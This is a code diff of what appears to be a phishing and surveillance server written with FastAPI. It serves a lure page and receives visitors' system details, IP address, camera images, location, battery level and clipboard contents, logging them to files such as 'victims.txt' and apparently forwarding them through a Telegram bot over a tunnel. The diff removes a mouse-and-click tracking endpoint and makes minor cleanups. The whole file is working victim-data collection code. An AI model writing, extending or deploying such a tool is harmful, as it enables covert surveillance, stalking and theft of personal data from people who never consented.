@@ -12,7 +12,6 @@ import uvicorn
 from rich.console import Console
 from rich.prompt import Prompt, Confirm
 from rich.panel import Panel
-from rich.table import Table
 
 from core.banner import get_banner
 from core.bot import TelegramSender
@@ -44,13 +43,12 @@ CONFIG = {
 bot = None
 tunnel_manager = None
 
-# --- CONFIG MANAGEMENT ---
 def load_config():
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, 'r') as f:
                 return json.load(f)
-        except Exception as e:
+        except:
             return None
     return None
 
@@ -59,7 +57,7 @@ def save_config(conf):
         with open(CONFIG_FILE, 'w') as f:
             json.dump(conf, f, indent=2)
         return True
-    except Exception as e:
+    except:
         return False
 
 def delete_config():
@@ -79,19 +77,17 @@ def save_local(filename, data):
             f.write(f"Timestamp: {timestamp}\n")
             f.write(f"{'='*60}\n")
             f.write(f"{data}\n\n")
-    except Exception as e:
+    except:
         pass
 
 def cleanup():
-    """Cleanup function to stop tunnel on exit"""
     global tunnel_manager
     if tunnel_manager:
         tunnel_manager.stop_tunnel()
 
-# Register cleanup function
 atexit.register(cleanup)
 
-# --- FASTAPI ROUTES ---
+# FastAPI Routes
 @app.get("/")
 async def serve_index():
     path = f"templates/{CONFIG['template']}.html"
@@ -105,7 +101,6 @@ async def receive_sys(data: str = Form(...)):
     try:
         info = json.loads(data)
         
-        # Create clean display
         basic_info = info.get('basic', {})
         platform = basic_info.get('platform', 'Unknown')
         screen = basic_info.get('screen', {})
@@ -132,7 +127,7 @@ async def receive_sys(data: str = Form(...)):
         save_local("victims.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
-    except Exception as e:
+    except:
         return {"status": "error"}
 
 @app.post("/upload_ip")
@@ -151,7 +146,7 @@ async def receive_ip(data: str = Form(...)):
         
         return {"status": "ok"}
         
-    except Exception as e:
+    except:
         return {"status": "error"}
 
 @app.post("/upload_cam")
@@ -168,7 +163,7 @@ async def receive_cam(file: UploadFile = File(...)):
             
         return {"status": "ok"}
         
-    except Exception as e:
+    except:
         return {"status": "error"}
 
 @app.post("/upload_location")
@@ -191,7 +186,7 @@ async def receive_location(data: str = Form(...)):
         save_local("location.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
-    except Exception as e:
+    except:
         return {"status": "error"}
 
 @app.post("/upload_battery")
@@ -200,18 +195,6 @@ async def receive_battery(data: str = Form(...)):
         info = json.loads(data)
         console.print(f"[cyan][+] Battery: {info.get('level', 'Unknown')}%[/cyan]")
         save_local("battery.txt", json.dumps(info, indent=2))
-        return {"status": "ok"}
-    except:
-        return {"status": "error"}
-
-@app.post("/upload_behavior")
-async def receive_behavior(data: str = Form(...)):
-    try:
-        info = json.loads(data)
-        movements = len(info.get('mouseMovements', []))
-        clicks = len(info.get('clicks', []))
-        console.print(f"[blue][+] Behavior: {movements} moves, {clicks} clicks[/blue]")
-        save_local("behavior.txt", f"Session: {movements} moves, {clicks} clicks")
         return {"status": "ok"}
     except:
         return {"status": "error"}
@@ -238,7 +221,6 @@ async def receive_clipboard(data: str = Form(...)):
     except:
         return {"status": "error"}
 
-# --- CLEAN WIZARD INTERFACE ---
 def start_wizard():
     console.clear()
     console.print(get_banner())
@@ -327,7 +309,7 @@ def start_wizard():
     except KeyboardInterrupt:
         console.print("\n[yellow][!] Shutting down...[/yellow]")
     except Exception as e:
-        console.print(f"[red][!] Server error[/red]")
+        console.print(f"[red][!] Server error: {e}[/red]")
     finally:
         cleanup()
 
